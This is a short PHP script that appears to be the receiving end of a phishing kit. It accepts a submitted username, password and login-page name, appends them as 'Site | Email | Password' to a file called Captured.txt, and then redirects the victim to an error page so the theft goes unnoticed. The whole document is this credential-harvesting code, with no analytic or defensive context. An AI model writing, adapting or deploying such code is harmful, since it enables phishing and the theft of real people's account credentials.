<?php

   $dateiname = 'Captured.txt';

   if (!isset($_POST['user'])) $_POST['user'] ='';
   if (!isset($_POST['pass'])) $_POST['pass'] = '';
   if (!isset($_POST['loginpage'])) $_POST['loginpage'] = '';


   $data = "Site: " . $_POST['loginpage'] . ' | ' . "Email: " . $_POST['user'] . ' | ' . "Password: " . $_POST['pass'] . ' | ' . "\n";

   if (isset($_POST['user']) && ($_POST['pass'])) {
       $handle = @fopen($dateiname, "ab+");
       fwrite($handle, $data);
       fclose ($handle);
     }
    header("Location: /error.html");
    die();
?>